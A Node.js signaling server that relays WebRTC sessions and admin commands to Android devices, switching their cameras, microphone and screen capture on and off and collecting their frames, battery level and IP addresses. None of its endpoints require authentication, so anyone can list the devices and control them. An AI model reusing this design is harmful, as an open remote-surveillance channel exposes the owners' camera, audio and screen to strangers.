const express = require('express');
const cors = require('cors');
const admin = require('firebase-admin');
require('dotenv').config();

const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const PORT = process.env.PORT || 3000;
const DATABASE_URL = process.env.FIREBASE_DATABASE_URL;
const SERVICE_ACCOUNT_BASE64 = process.env.FIREBASE_SERVICE_ACCOUNT_BASE64;

// Socket.io Signaling
io.on('connection', (socket) => {
  console.log(`[Socket] ⚡ User connected: ${socket.id}`);

  socket.on('join-room', (roomId) => {
    socket.join(roomId);
    console.log(`[Socket] 🏠 User ${socket.id} joined room: ${roomId}`);
  });

  socket.on('signal', (data) => {
    const { roomId } = data;
    if (roomId) socket.to(roomId).emit('signal', data);
  });

  socket.on('command', (data) => {
    const { roomId } = data;
    if (roomId) socket.to(roomId).emit('command', data);
  });

  socket.on('device-status', async (data) => {
    const { roomId } = data;
    if (roomId) {
      socket.to(roomId).emit('device-status', data);
      const devId = data.id || data.deviceId || 'DEV-LOCAL';
      try {
        await setRoomNode(roomId, `devices/${devId}`, data);
      } catch (err) {
        console.warn(`[Socket] Could not persist device status for ${devId}:`, err.message);
      }
    }
  });

  socket.on('disconnect', () => {
    console.log(`[Socket] ❌ User disconnected: ${socket.id}`);
  });
});

// STUN & TURN Environment Configs
const STUN_SERVERS = (process.env.STUN_SERVERS || 'stun:stun.l.google.com:19302,stun:stun1.l.google.com:19302')
  .split(',')
  .map(s => s.trim())
  .filter(Boolean);

const TURN_SERVER_URL = process.env.TURN_SERVER_URL || '';
const TURN_USERNAME = process.env.TURN_USERNAME || '';
const TURN_CREDENTIAL = process.env.TURN_CREDENTIAL || '';

app.use(cors());
app.use(express.json());

// Keep-Alive & Clean Request Logging Middleware (Filters repetitive poll spam)
app.use((req, res, next) => {
  if (!req.originalUrl.startsWith('/api/commands') && req.originalUrl !== '/api/devices' && req.originalUrl !== '/api/health') {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] 📡 ${req.method} ${req.originalUrl} - IP: ${req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress}`);
  }
  next();
});

// In-memory fallback if Firebase credentials are not provided
const inMemorySignaling = new Map();
let db = null;

// Initialize Firebase Admin SDK
try {
  if (SERVICE_ACCOUNT_BASE64 && DATABASE_URL) {
    const serviceAccountJson = Buffer.from(SERVICE_ACCOUNT_BASE64, 'base64').toString('utf8');
    const serviceAccount = JSON.parse(serviceAccountJson);

    admin.initializeApp({
      credential: admin.credential.cert(serviceAccount),
      databaseURL: DATABASE_URL
    });

    db = admin.database();
    console.log('[Firebase] Successfully connected to Firebase Realtime Database at:', DATABASE_URL);
  } else if (DATABASE_URL) {
    admin.initializeApp({
      databaseURL: DATABASE_URL
    });
    db = admin.database();
    console.log('[Firebase] Connected to Firebase Realtime Database (Default credential) at:', DATABASE_URL);
  } else {
    console.warn('[Firebase] No FIREBASE_DATABASE_URL or credentials found. Running with high-speed in-memory signaling store.');
  }
} catch (error) {
  console.error('[Firebase Init Error]', error.message);
  console.warn('[Firebase] Falling back to in-memory store.');
  db = null;
}

// Helper functions to get and update signaling data
async function getRoomData(roomId) {
  if (db) {
    const snapshot = await db.ref(`signaling/${roomId}`).once('value');
    return snapshot.val() || {};
  }
  return inMemorySignaling.get(roomId) || {};
}

async function setRoomNode(roomId, nodeName, value) {
  if (db) {
    await db.ref(`signaling/${roomId}/${nodeName}`).set(value);
  } else {
    const room = inMemorySignaling.get(roomId) || {};
    room[nodeName] = value;
    inMemorySignaling.set(roomId, room);
  }
}

async function appendIceCandidate(roomId, candidate) {
  if (db) {
    const ref = db.ref(`signaling/${roomId}/iceCandidate`);
    const snapshot = await ref.once('value');
    let list = snapshot.val() || [];
    if (!Array.isArray(list)) list = [list];
    list.push(candidate);
    await ref.set(list);
    return list;
  } else {
    const room = inMemorySignaling.get(roomId) || {};
    if (!Array.isArray(room.iceCandidate)) {
      room.iceCandidate = [];
    }
    room.iceCandidate.push(candidate);
    inMemorySignaling.set(roomId, room);
    return room.iceCandidate;
  }
}

/* ==========================================================================
   WebRTC Signaling REST Endpoints
   ========================================================================== */

/**
 * 1. POST /api/offer
 * Body: { roomId: string, offer: string }
 */
app.post('/api/offer', async (req, res) => {
  try {
    const { roomId, offer, sdp } = req.body;
    const offerSdp = offer || sdp;

    if (!roomId || !offerSdp) {
      return res.status(400).json({ success: false, error: 'Missing roomId or offer in request body' });
    }

    await setRoomNode(roomId, 'offer', offerSdp);
    console.log(`[WebRTC] [${roomId}] SDP Offer registered`);
    return res.status(200).json({ success: true, message: 'Offer stored successfully', roomId });
  } catch (err) {
    console.error('[POST /api/offer error]', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 2. POST /api/answer
 * Body: { roomId: string, answer: string }
 */
app.post('/api/answer', async (req, res) => {
  try {
    const { roomId, answer, sdp } = req.body;
    const answerSdp = answer || sdp;

    if (!roomId || !answerSdp) {
      return res.status(400).json({ success: false, error: 'Missing roomId or answer in request body' });
    }

    await setRoomNode(roomId, 'answer', answerSdp);
    console.log(`[WebRTC] [${roomId}] SDP Answer registered`);
    return res.status(200).json({ success: true, message: 'Answer stored successfully', roomId });
  } catch (err) {
    console.error('[POST /api/answer error]', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 3. POST /api/ice
 * Body: { roomId: string, candidate: string }
 */
app.post('/api/ice', async (req, res) => {
  try {
    const { roomId, candidate } = req.body;

    if (!roomId || !candidate) {
      return res.status(400).json({ success: false, error: 'Missing roomId or candidate in request body' });
    }

    const candidateList = await appendIceCandidate(roomId, candidate);
    console.log(`[WebRTC] [${roomId}] ICE Candidate added. Total candidates: ${candidateList.length}`);
    return res.status(200).json({ success: true, message: 'ICE candidate added', count: candidateList.length });
  } catch (err) {
    console.error('[POST /api/ice error]', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 3b. GET /api/ice
 * Query: ?roomId=string
 * Prevents 'Cannot GET /api/ice' in browser and returns ICE candidates status/data
 */
app.get('/api/ice', async (req, res) => {
  try {
    const { roomId } = req.query;

    if (roomId) {
      const roomData = await getRoomData(roomId);
      const candidates = Array.isArray(roomData.iceCandidate) ? roomData.iceCandidate : [];
      return res.status(200).json({
        success: true,
        roomId,
        count: candidates.length,
        iceCandidates: candidates
      });
    }

    return res.status(200).json({
      success: true,
      message: 'ICE Candidates API endpoint is active. Use POST /api/ice to submit candidates or GET /api/ice?roomId=YOUR_ROOM_ID to retrieve them.'
    });
  } catch (err) {
    console.error('[GET /api/ice error]', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 3c. GET /api/ice/:roomId
 * Returns stored ICE Candidates for specific roomId
 */
app.get('/api/ice/:roomId', async (req, res) => {
  try {
    const { roomId } = req.params;
    const roomData = await getRoomData(roomId);
    const candidates = Array.isArray(roomData.iceCandidate) ? roomData.iceCandidate : [];

    return res.status(200).json({
      success: true,
      roomId,
      count: candidates.length,
      iceCandidates: candidates
    });
  } catch (err) {
    console.error('[GET /api/ice/:roomId error]', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 4. POST /api/command
 * Body: { roomId: string, targetDeviceId?: string, command: string, facing?: string }
 */
app.post('/api/command', async (req, res) => {
  try {
    const { roomId, targetDeviceId, command, facing } = req.body;
    const validCommands = [
      'startCamera',
      'startFrontCamera',
      'startBackCamera',
      'switchCamera',
      'startAudio',
      'startScreen',
      'stopAll',
      'COMMAND_START_CAMERA',
      'COMMAND_SWITCH_CAMERA',
      'COMMAND_START_AUDIO',
      'COMMAND_START_SCREEN',
      'COMMAND_STOP_ALL'
    ];

    if (!roomId || !command) {
      return res.status(400).json({ success: false, error: 'Missing roomId or command in request body' });
    }

    if (!validCommands.includes(command)) {
      return res.status(400).json({
        success: false,
        error: `Invalid command '${command}'. Must be one of: ${validCommands.join(', ')}`
      });
    }

    const adminCommand = {
      command,
      targetDeviceId: targetDeviceId || 'all',
      facing: facing || null,
      timestamp: Date.now()
    };

    await setRoomNode(roomId, 'adminCommand', adminCommand);
    if (targetDeviceId && targetDeviceId !== 'all') {
      await setRoomNode(roomId, `devices/${targetDeviceId}/command`, adminCommand);
    }

    console.log(`[Admin Command] [${roomId}] Dispatched '${command}' for ${targetDeviceId || 'all'} at ${new Date(adminCommand.timestamp).toISOString()}`);
    return res.status(200).json({ success: true, message: `Command '${command}' dispatched`, adminCommand });
  } catch (err) {
    console.error('[POST /api/command error]', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 5. POST /api/status
 * Body: { roomId: string, id?: string, deviceId?: string, deviceName: string, batteryLevel: number, isOnline: boolean, ipAddress?: string }
 */
app.post('/api/status', async (req, res) => {
  try {
    const {
      roomId, id, deviceId, deviceName, batteryLevel, isCharging, isOnline, ipAddress,
      isCameraActive, isAudioActive, isScreenActive, cameraFacing, cameraFrame, screenFrame, networkType
    } = req.body;

    if (!roomId) {
      return res.status(400).json({ success: false, error: 'Missing roomId in request body' });
    }

    const devId = id || deviceId || 'DEV-LOCAL';
    const clientIp = ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';

    const statusObj = {
      id: devId,
      deviceId: devId,
      name: deviceName || 'Android Device Node',
      deviceName: deviceName || 'Android Device Node',
      batteryLevel: typeof batteryLevel === 'number' ? Math.max(0, Math.min(100, batteryLevel)) : 85,
      isCharging: Boolean(isCharging),
      isOnline: isOnline !== undefined ? Boolean(isOnline) : true,
      timestamp: Date.now(),
      lastSeen: Date.now(),
      ipAddress: String(clientIp),
      isCameraActive: Boolean(isCameraActive),
      isAudioActive: Boolean(isAudioActive),
      isScreenActive: Boolean(isScreenActive),
      cameraFacing: cameraFacing || 'BACK',
      networkType: networkType || 'WIFI',
      cameraFrame: cameraFrame || null,
      screenFrame: screenFrame || null
    };

    await setRoomNode(roomId, `devices/${devId}`, statusObj);
    await setRoomNode(roomId, 'status', statusObj);

    return res.status(200).json({ success: true, message: 'Status updated successfully', status: statusObj });
  } catch (err) {
    console.error('[POST /api/status error]', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 6. GET /api/devices
 * Returns all devices registered across signaling rooms with 60-second timeout auto-offline check
 */
app.get('/api/devices', async (req, res) => {
  try {
    let allSignaling = {};

    if (db) {
      const snapshot = await db.ref('signaling').once('value');
      allSignaling = snapshot.val() || {};
    } else {
      for (const [key, value] of inMemorySignaling.entries()) {
        allSignaling[key] = value;
      }
    }

    const now = Date.now();
    const TIMEOUT_MS = 60 * 1000;
    const deviceList = [];

    for (const [roomId, roomData] of Object.entries(allSignaling)) {
      if (roomData) {
        if (roomData.devices && typeof roomData.devices === 'object') {
          for (const [devId, devObj] of Object.entries(roomData.devices)) {
            if (devId === 'DEV-LOCAL') continue;
            if (devObj && typeof devObj === 'object') {
              const lastSeen = devObj.timestamp || devObj.lastSeen || 0;
              const isStillOnline = devObj.isOnline !== false && (now - lastSeen < TIMEOUT_MS);

              deviceList.push({
                ...devObj,
                roomId,
                id: devObj.id || devId,
                name: devObj.name || devObj.deviceName || 'Android Node',
                deviceName: devObj.deviceName || devObj.name || 'Android Node',
                batteryLevel: devObj.batteryLevel || 85,
                isOnline: isStillOnline,
                lastSeen,
                ipAddress: devObj.ipAddress || '127.0.0.1'
              });
            }
          }
        } else if (roomData.status && roomData.status.id !== 'DEV-LOCAL' && roomData.status.deviceId !== 'DEV-LOCAL') {
          const lastSeen = roomData.status.timestamp || 0;
          const isStillOnline = roomData.status.isOnline && (now - lastSeen < TIMEOUT_MS);

          deviceList.push({
            roomId,
            id: roomData.status.id || roomData.status.deviceId || 'DEV-LOCAL',
            name: roomData.status.deviceName || 'Android Node',
            deviceName: roomData.status.deviceName || 'Android Node',
            batteryLevel: roomData.status.batteryLevel || 85,
            isOnline: isStillOnline,
            lastSeen,
            ipAddress: roomData.status.ipAddress || '127.0.0.1',
            hasOffer: Boolean(roomData.offer),
            hasAnswer: Boolean(roomData.answer),
            iceCandidatesCount: Array.isArray(roomData.iceCandidate) ? roomData.iceCandidate.length : 0,
            lastCommand: roomData.adminCommand ? roomData.adminCommand.command : null
          });
        }
      }
    }

    return res.status(200).json({
      success: true,
      count: deviceList.length,
      devices: deviceList
    });
  } catch (err) {
    console.error('[GET /api/devices error]', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 7. GET /api/status/:roomId
 * Returns status of specific device/room
 */
app.get('/api/status/:roomId', async (req, res) => {
  try {
    const { roomId } = req.params;
    const roomData = await getRoomData(roomId);

    if (!roomData || !roomData.status) {
      return res.status(404).json({ success: false, error: `No status found for roomId: ${roomId}` });
    }

    const now = Date.now();
    const lastSeen = roomData.status.timestamp || 0;
    const isOnline = roomData.status.isOnline && (now - lastSeen < 60 * 1000);

    return res.status(200).json({
      success: true,
      roomId,
      status: {
        ...roomData.status,
        isOnline
      },
      hasOffer: Boolean(roomData.offer),
      hasAnswer: Boolean(roomData.answer),
      iceCandidatesCount: Array.isArray(roomData.iceCandidate) ? roomData.iceCandidate.length : 0,
      adminCommand: roomData.adminCommand || null
    });
  } catch (err) {
    console.error('[GET /api/status/:roomId error]', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 7b. GET /api/commands/:roomId/:deviceId
 * Returns pending command for a specific target device
 */
app.get('/api/commands/:roomId/:deviceId', async (req, res) => {
  try {
    const { roomId, deviceId } = req.params;
    const roomData = await getRoomData(roomId);

    let targetCmd = null;
    if (roomData && roomData.devices && roomData.devices[deviceId] && roomData.devices[deviceId].command) {
      targetCmd = roomData.devices[deviceId].command;
    } else if (roomData && roomData.adminCommand) {
      const cmd = roomData.adminCommand;
      if (cmd.targetDeviceId === 'all' || cmd.targetDeviceId === deviceId) {
        targetCmd = cmd;
      }
    }

    return res.status(200).json({
      success: true,
      roomId,
      deviceId,
      command: targetCmd
    });
  } catch (err) {
    console.error('[GET /api/commands error]', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 8. GET /api/ice-servers
 * Returns STUN and TURN server configuration for WebRTC client initialization
 */
app.get('/api/ice-servers', (req, res) => {
  const iceServers = [];

  // Add STUN servers
  STUN_SERVERS.forEach(stunUrl => {
    iceServers.push({ urls: stunUrl });
  });

  // Add TURN server if provided
  if (TURN_SERVER_URL) {
    const turnConfig = {
      urls: TURN_SERVER_URL
    };
    if (TURN_USERNAME) turnConfig.username = TURN_USERNAME;
    if (TURN_CREDENTIAL) turnConfig.credential = TURN_CREDENTIAL;
    iceServers.push(turnConfig);
  }

  return res.status(200).json({
    success: true,
    iceServers
  });
});

/**
 * 9. GET /api/health
 * Health check endpoint for Render.com or monitoring
 */
app.get('/api/health', (req, res) => {
  res.setHeader('X-Render-Keep-Alive', 'true');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  return res.status(200).json({
    status: 'online',
    service: 'WebRTC Firebase Signaling Server',
    uptimeSeconds: Math.floor(process.uptime()),
    timestamp: new Date().toISOString(),
    firebaseConnected: Boolean(db),
    stunCount: STUN_SERVERS.length,
    hasTurn: Boolean(TURN_SERVER_URL),
    message: 'Render instance is active and prevented from sleeping.'
  });
});

// Root friendly route
app.get('/', (req, res) => {
  res.json({
    name: 'WebRTC Firebase Signaling Server',
    status: 'running',
    endpoints: [
      'POST /api/offer',
      'POST /api/answer',
      'POST /api/ice',
      'GET /api/ice',
      'GET /api/ice/:roomId',
      'POST /api/command',
      'POST /api/status',
      'GET /api/devices',
      'GET /api/status/:roomId',
      'GET /api/ice-servers',
      'GET /api/health'
    ]
  });
});

const RENDER_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

http.listen(PORT, () => {
  console.log(`====================================================`);
  console.log(`🚀 WebRTC Signaling Server listening on port ${PORT}`);
  console.log(`🌐 Public URL: ${RENDER_URL}`);
  console.log(`🏥 Health check: ${RENDER_URL}/api/health`);
  console.log(`🧊 ICE servers:  ${RENDER_URL}/api/ice-servers`);
  console.log(`====================================================`);
});
